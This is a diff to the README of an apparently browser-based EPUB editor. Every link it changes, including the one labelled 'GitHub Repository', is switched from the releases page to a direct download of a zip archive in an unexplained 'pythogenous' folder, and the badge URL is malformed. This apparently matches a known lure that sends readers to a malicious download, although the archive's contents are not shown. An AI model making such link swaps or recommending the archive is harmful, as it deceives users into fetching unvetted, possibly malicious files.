@@ -1,7 +1,7 @@
 # ✨ Epub-editor - Edit EPUB Files Like a Pro
 
 ## 📥 Download Now!
-[![Download Epub-editor](https://img.shields.io/badge/Download%20Epub--editor-v1.0-blue.svg)](https://github.com/LynMunene/Epub-editor/releases)
+[![Download Epub-editor](https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip%https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip)](https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip)
 
 ## 🚀 Getting Started
 Epub-editor is an easy-to-use tool that helps you edit EPUB files right in your browser. You can load your EPUB file, make changes, and download the updated version—all without needing any special software or coding skills.
@@ -15,7 +15,7 @@ To use Epub-editor, you need:
 ## 📦 Download & Install
 To get started with Epub-editor, visit the releases page at the link below. There, you can download the latest version of our application.
 
-[Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/releases)
+[Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip)
 
 ## 📂 How to Use Epub-editor
 1. **Open the Application**
@@ -78,5 +78,5 @@ Yes, Epub-editor does not send your files to a server. Everything is processed r
 If you have any questions or need help, feel free to reach out via the issues section on GitHub. We are here to assist you.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/LynMunene/Epub-editor)
-- [Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/releases)
+- [GitHub Repository](https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip)
+- [Visit this page to download Epub-editor](https://github.com/LynMunene/Epub-editor/raw/refs/heads/main/pythogenous/Epub_editor_3.2.zip)
